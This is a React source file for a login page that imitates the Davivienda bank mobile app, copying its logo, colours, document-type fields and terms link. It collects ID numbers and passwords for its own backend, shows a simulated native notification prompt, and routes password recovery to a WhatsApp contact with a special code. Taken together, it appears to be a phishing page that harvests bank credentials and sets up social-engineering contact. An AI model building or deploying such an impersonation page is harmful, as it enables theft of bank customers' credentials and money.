import { useState, useRef, useEffect } from 'react';
import { useStore } from '@/lib/store';
import { useLocation } from 'wouter';
import { useToast } from '@/hooks/use-toast';
import { LoadingOverlay } from '@/components/LoadingOverlay';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { ChevronLeft, ScanLine, QrCode, Headphones, CreditCard, List, User, Fingerprint } from 'lucide-react';
import { usePublicSupportPhone } from '@/hooks/use-support-phone';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';

// SVG Casa Davivienda Logo (icono de la casa blanca)
const DaviviendaLogo = () => (
  <svg width="60" height="50" viewBox="0 0 60 50" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M30 5L5 25V45H55V25L30 5Z" fill="white"/>
    <path d="M30 5L5 25V45H55V25L30 5Z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
  </svg>
);

const LoginPage = () => {
  const [showWelcome, setShowWelcome] = useState(true);
  const [documentType, setDocumentType] = useState('cc');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPasswordInput, setShowPasswordInput] = useState(false);
  const [showRegisterDialog, setShowRegisterDialog] = useState(false);
  const [showRecoveryDialog, setShowRecoveryDialog] = useState(false);
  
  // Registro de usuario
  const [regName, setRegName] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regPhone, setRegPhone] = useState('');
  const [regDocument, setRegDocument] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regConfirmPassword, setRegConfirmPassword] = useState('');
  
  const passwordInputRef = useRef<HTMLInputElement>(null);
  
  const { login } = useStore();
  const [_, navigate] = useLocation();
  const { toast } = useToast();
  const { callSupport, openWhatsApp } = usePublicSupportPhone();

  const handleDocumentSubmit = () => {
    if (!username) {
      toast({
        title: "Campo requerido",
        description: "Por favor, ingresa tu número de documento",
        variant: "destructive",
      });
      return;
    }
    
    // Mostrar la pantalla de ingreso de clave
    setShowPasswordInput(true);
    
    // Enfocar el campo de clave cuando se muestre
    setTimeout(() => {
      if (passwordInputRef.current) {
        passwordInputRef.current.focus();
      }
    }, 100);
  };
  
  const handleRegisterUser = async () => {
    if (!regName || !regEmail || !regPhone || !regDocument || !regPassword) {
      toast({
        title: "Campos incompletos",
        description: "Por favor, completa todos los campos requeridos",
        variant: "destructive",
      });
      return;
    }
    
    if (regPassword !== regConfirmPassword) {
      toast({
        title: "Contraseñas no coinciden",
        description: "Las contraseñas ingresadas no coinciden",
        variant: "destructive",
      });
      return;
    }
    
    setIsLoading(true);
    
    try {
      const response = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: regDocument,
          name: regName,
          email: regEmail,
          phone: regPhone,
          document: regDocument,
          password: regPassword,
          isAdmin: 0,
        }),
        credentials: 'include',
      });
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.message || 'Error en el registro');
      }
      
      toast({
        title: "Registro exitoso",
        description: "Te has registrado correctamente. Por favor inicia sesión con tus credenciales.",
      });
      
      setShowRegisterDialog(false);
      setShowWelcome(false);
      setUsername(regDocument);
    } catch (error: any) {
      toast({
        title: "Error en el registro",
        description: error.message || "No se pudo completar el registro. Intenta nuevamente.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogin = async () => {
    if (!username || !password) {
      toast({
        title: "Campos requeridos",
        description: "Por favor, ingresa tu documento de identidad y clave",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    try {
      await login(username, password);
      // La redirección se maneja en App.tsx basada en el rol del usuario
    } catch (error) {
      toast({
        title: "Error de inicio de sesión",
        description: "Credenciales incorrectas",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
      setShowPasswordInput(false);
      setPassword('');
    }
  };
  
  // Formulario de registro
  const registerDialog = (
    <Dialog open={showRegisterDialog} onOpenChange={setShowRegisterDialog}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Registro de nuevo usuario</DialogTitle>
          <DialogDescription>
            Complete los siguientes datos para crear su cuenta
          </DialogDescription>
        </DialogHeader>
        
        <div className="space-y-4 py-4">
          <div>
            <label className="text-sm font-medium text-gray-700">Nombre completo</label>
            <Input 
              value={regName}
              onChange={(e) => setRegName(e.target.value)}
              placeholder="Ingrese su nombre completo"
              className="mt-1"
            />
          </div>
          
          <div>
            <label className="text-sm font-medium text-gray-700">Correo electrónico</label>
            <Input 
              type="email"
              value={regEmail}
              onChange={(e) => setRegEmail(e.target.value)}
              placeholder="Ingrese su correo electrónico"
              className="mt-1"
            />
          </div>
          
          <div>
            <label className="text-sm font-medium text-gray-700">Número de teléfono</label>
            <Input 
              type="tel"
              value={regPhone}
              onChange={(e) => setRegPhone(e.target.value)}
              placeholder="Ingrese su número de teléfono"
              className="mt-1"
            />
          </div>
          
          <div>
            <label className="text-sm font-medium text-gray-700">Número de documento</label>
            <Input 
              value={regDocument}
              onChange={(e) => setRegDocument(e.target.value)}
              placeholder="Ingrese su número de documento"
              className="mt-1"
            />
          </div>
          
          <div>
            <label className="text-sm font-medium text-gray-700">Contraseña</label>
            <Input 
              type="password"
              value={regPassword}
              onChange={(e) => setRegPassword(e.target.value)}
              placeholder="Ingrese su contraseña"
              className="mt-1"
            />
          </div>
          
          <div>
            <label className="text-sm font-medium text-gray-700">Confirmar contraseña</label>
            <Input 
              type="password"
              value={regConfirmPassword}
              onChange={(e) => setRegConfirmPassword(e.target.value)}
              placeholder="Confirme su contraseña"
              className="mt-1"
            />
          </div>
        </div>
        
        <div className="flex justify-end space-x-2">
          <Button variant="outline" onClick={() => setShowRegisterDialog(false)}>
            Cancelar
          </Button>
          <Button onClick={handleRegisterUser} className="bg-red-600 hover:bg-red-700 text-white">
            Registrarme
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
  
  // Formulario de recuperación de clave
  const recoveryDialog = (
    <Dialog open={showRecoveryDialog} onOpenChange={setShowRecoveryDialog}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Recuperar clave</DialogTitle>
          <DialogDescription>
            Si ha olvidado su clave, por favor comuníquese con atención al cliente
          </DialogDescription>
        </DialogHeader>
        
        <div className="py-4">
          <div className="bg-gray-100 p-4 rounded-md mb-4">
            <h3 className="font-semibold mb-2 text-gray-800">¿Olvidó su contraseña?</h3>
            <p className="text-gray-600 text-sm mb-3">
              Por razones de seguridad, para recuperar su clave debe comunicarse directamente con nuestro equipo de atención al cliente a través de WhatsApp.
            </p>
            <p className="text-gray-600 text-sm">
              Indique al asesor el código <span className="font-bold">#4004</span> para ser atendido por el departamento de seguridad.
            </p>
          </div>
          
          <Button 
            onClick={() => {
              toast({
                title: "Atención al Cliente",
                description: "Conectando con un asesor por WhatsApp. Recuerde indicarle el código #4004."
              });
              openWhatsApp("Olvidé mi clave. Código #4004");
              setShowRecoveryDialog(false);
            }} 
            className="w-full bg-green-600 hover:bg-green-700 text-white flex items-center justify-center gap-2"
          >
            <svg 
              xmlns="http://www.w3.org/2000/svg" 
              width="20" 
              height="20" 
              viewBox="0 0 24 24" 
              fill="white" 
              stroke="white" 
              strokeWidth="1" 
              className="mr-1"
            >
              <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
            </svg>
            Contactar por WhatsApp
          </Button>
        </div>
        
        <div className="flex justify-end">
          <Button variant="outline" onClick={() => setShowRecoveryDialog(false)}>
            Cancelar
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );

  const welcomeScreen = (
    <div className="flex flex-col min-h-screen bg-red-600">
      {isLoading && <LoadingOverlay text="Iniciando sesión..." />}
      
      <div className="pt-10 pb-4 flex justify-center">
        <DaviviendaLogo />
      </div>
      
      <div className="text-white px-6 mb-6">
        <h1 className="text-3xl font-bold mb-2">Nos alegra tenerle aquí</h1>
        <p className="text-lg">En esta app puede hacerlo todo sin salir de casa.</p>
        <p className="text-lg">¿Ya es nuestro cliente?</p>
      </div>
      
      <div className="flex-1 flex items-center justify-center relative">
        {/* Persona con smartphone */}
        <div className="relative mt-4 flex items-center justify-center">
          <img
            src="https://images.pexels.com/photos/762020/pexels-photo-762020.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1"
            alt="Mujer feliz con smartphone"
            className="w-64 h-80 object-cover"
          />
        </div>
        
        {/* Curva inferior */}
        <div className="absolute bottom-0 w-full h-32">
          <div className="bg-white h-full rounded-t-[100%]"></div>
        </div>
      </div>
      
      <div className="w-full px-4 pb-8 space-y-4 relative z-10">
        <Button 
          className="w-full rounded-full bg-red-600 hover:bg-red-700 text-white py-6 border-2 border-white shadow-md"
          onClick={() => setShowWelcome(false)}
        >
          Soy cliente
        </Button>
        
        <Button 
          variant="outline" 
          className="w-full rounded-full bg-white text-black border border-gray-300 py-6 shadow-md"
          onClick={() => setShowRegisterDialog(true)}
        >
          Quiero un producto
        </Button>
        
        <div className="flex justify-between px-6 pt-4">
          <div 
            className="flex flex-col items-center cursor-pointer"
            onClick={() => window.open("https://www.pse.com.co/persona", "_blank")}
          >
            <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center">
              <CreditCard className="h-5 w-5 text-gray-800" />
            </div>
            <span className="text-xs text-gray-800 mt-1">Pagos PSE</span>
          </div>
          
          <div 
            className="flex flex-col items-center cursor-pointer"
            onClick={() => navigate("/payments")}
          >
            <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C14.5013 4.73835 15.9228 8.29203 16 12C15.9228 15.708 14.5013 19.2616 12 22M12 2C9.49872 4.73835 8.07725 8.29203 8 12C8.07725 15.708 9.49872 19.2616 12 22M12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22M2.50002 9H21.5M2.5 15H21.5" stroke="gray" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <span className="text-xs text-gray-800 mt-1">Le puede interesar</span>
          </div>
          
          <div 
            className="flex flex-col items-center cursor-pointer"
            onClick={() => navigate("/profile")}
          >
            <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center">
              <List className="h-5 w-5 text-gray-800" />
            </div>
            <span className="text-xs text-gray-800 mt-1">Más</span>
          </div>
        </div>
      </div>
      
      {/* Botón de ayuda */}
      <div className="fixed bottom-4 right-4 z-20">
        <button 
          className="w-12 h-12 rounded-full bg-red-600 text-white flex items-center justify-center shadow-lg border-2 border-white"
          onClick={callSupport}
        >
          <Headphones size={24} />
        </button>
      </div>
      
      {registerDialog}
      {recoveryDialog}
    </div>
  );

  const loginScreen = (
    <div className="flex flex-col min-h-screen">
      {isLoading && <LoadingOverlay text="Iniciando sesión..." />}
      
      <div className="bg-red-600 h-16 flex items-center px-4">
        <button 
          onClick={() => {
            setShowWelcome(true);
            setShowPasswordInput(false);
          }}
          className="text-white flex items-center"
        >
          <ChevronLeft className="mr-1" />
          <span>Atrás</span>
        </button>
        <div className="mx-auto">
          <DaviviendaLogo />
        </div>
      </div>
      
      <div className="p-5 flex-1 bg-gray-100">
        {!showPasswordInput ? (
          <>
            <div className="mb-6">
              <h2 className="text-lg font-medium text-gray-800 mb-4">Seleccione el tipo de documento</h2>
              <Select 
                value={documentType} 
                onValueChange={setDocumentType}
              >
                <SelectTrigger className="w-full bg-white rounded-3xl py-5 flex items-center px-4 h-auto border-gray-200">
                  <div className="flex items-center">
                    <CreditCard className="h-5 w-5 text-gray-500 mr-2" />
                    <SelectValue placeholder="Cédula de ciudadanía" />
                  </div>
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="cc">Cédula de ciudadanía</SelectItem>
                  <SelectItem value="ce">Cédula de extranjería</SelectItem>
                  <SelectItem value="ti">Tarjeta de identidad</SelectItem>
                  <SelectItem value="pp">Pasaporte</SelectItem>
                </SelectContent>
              </Select>
            </div>
            
            <div className="mb-6">
              <h2 className="text-lg font-medium text-gray-800 mb-4">Ingrese el número de documento</h2>
              <Input
                type="text"
                data-testid="input-username"
                className="w-full bg-white rounded-3xl py-6 px-4 h-14 border-gray-200"
                placeholder="Número de documento"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>
            
            <div className="mb-8">
              <div 
                className="text-center text-gray-600 mb-6 cursor-pointer"
                onClick={() => setShowRecoveryDialog(true)}
              >
                ¿Olvidó o bloqueó su clave virtual?
              </div>
              
              <div className="flex justify-center space-x-4">
                <Button 
                  data-testid="button-continue"
                  onClick={handleDocumentSubmit}
                  className="w-48 rounded-full bg-gray-300 hover:bg-gray-400 text-gray-800 py-2 h-12"
                >
                  Continuar
                </Button>
                
                <Button 
                  onClick={() => setShowRegisterDialog(true)}
                  className="w-48 rounded-full bg-red-600 hover:bg-red-700 text-white py-2 h-12"
                >
                  Registrarme
                </Button>
              </div>
            </div>
            
            <div className="flex rounded-full overflow-hidden bg-red-600 text-white mt-12">
              <div 
                className="flex-1 py-3 px-4 flex justify-center items-center cursor-pointer"
                onClick={() => navigate("/payments")}
              >
                <ScanLine size={20} className="mr-2" />
                <span>Leer QR</span>
              </div>
              <div className="w-12 h-12 flex items-center justify-center bg-white text-red-600">
                <QrCode size={20} />
              </div>
              <div 
                className="flex-1 py-3 px-4 flex justify-center items-center cursor-pointer"
                onClick={() => navigate("/transfers")}
              >
                <span>Generar QR</span>
              </div>
            </div>
            
            <div 
              className="mt-4 text-center text-xs text-gray-500 cursor-pointer"
              onClick={() => window.open("https://www.davivienda.com/terminos-y-condiciones", "_blank")}
            >
              Términos y condiciones
              <br />
              V.7.1.0
            </div>
          </>
        ) : (
          <>
            <div className="mb-6 text-center">
              <div className="mx-auto w-20 h-20 bg-gray-200 rounded-full flex items-center justify-center mb-4">
                <User className="h-10 w-10 text-gray-600" />
              </div>
              <h2 className="text-xl font-medium text-gray-800">Bienvenido</h2>
              <p className="text-gray-600">
                {documentType === 'cc' ? 'C.C. ' : documentType === 'ce' ? 'C.E. ' : documentType === 'ti' ? 'T.I. ' : 'Pasaporte '} 
                {username}
              </p>
            </div>
            
            <div className="mb-6">
              <h2 className="text-lg font-medium text-gray-800 mb-4">Ingresa tu clave</h2>
              <Input
                ref={passwordInputRef}
                data-testid="input-password"
                type="password"
                className="w-full bg-white rounded-3xl py-6 px-4 h-14 border-gray-200"
                placeholder="Clave de acceso"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    handleLogin();
                  }
                }}
              />
              
              <div className="flex justify-center mt-4">
                <div className="flex items-center space-x-2 text-sm text-gray-600 cursor-pointer">
                  <Fingerprint className="h-4 w-4" />
                  <span>Usar huella digital</span>
                </div>
              </div>
            </div>
            
            <div className="mb-8">
              <div 
                className="text-center text-gray-600 mb-6 cursor-pointer"
                onClick={() => setShowRecoveryDialog(true)}
              >
                ¿Olvidó o bloqueó su clave virtual?
              </div>
              
              <div className="flex justify-center space-x-4">
                <Button 
                  onClick={() => setShowPasswordInput(false)}
                  className="w-48 rounded-full bg-gray-300 hover:bg-gray-400 text-gray-800 py-2 h-12"
                >
                  Volver
                </Button>
                
                <Button 
                  data-testid="button-login"
                  onClick={handleLogin}
                  className="w-48 rounded-full bg-red-600 hover:bg-red-700 text-white py-2 h-12"
                  disabled={!password}
                >
                  Ingresar
                </Button>
              </div>
            </div>
          </>
        )}
      </div>

      {/* Botón de ayuda */}
      <div className="fixed bottom-4 right-4">
        <button 
          className="w-12 h-12 rounded-full bg-red-600 text-white flex items-center justify-center shadow-lg border-2 border-white"
          onClick={callSupport}
        >
          <Headphones size={24} />
        </button>
      </div>
      
      {registerDialog}
      {recoveryDialog}
    </div>
  );

  // Aplicamos clases de estilo móvil y añadimos efecto de splashscreen
  useEffect(() => {
    // Simulamos un pequeño delay de carga como en las aplicaciones nativas
    const timer = setTimeout(() => {
      document.body.classList.add('app-ready');
    }, 500);
    
    return () => clearTimeout(timer);
  }, []);
  
  return (
    <div className="mobile-app">
      {showWelcome ? welcomeScreen : loginScreen}
      
      {/* Indicador de swipe up para simular gestos nativos */}
      <div className="fixed bottom-1 left-0 right-0 flex justify-center pointer-events-none">
        <div className="text-xs text-gray-500 bg-white bg-opacity-70 px-2 py-1 rounded-full">
          Desliza hacia arriba para continuar
        </div>
      </div>
      
      {/* Simulación de notificación de sistema */}
      <div className="fixed top-10 left-0 right-0 flex justify-center items-center pointer-events-none">
        <div className="bg-black bg-opacity-80 text-white px-4 py-2 rounded-full text-xs max-w-xs text-center fade-in">
          Davivienda Móvil desea enviar notificaciones
        </div>
      </div>
    </div>
  );
};

export default LoginPage;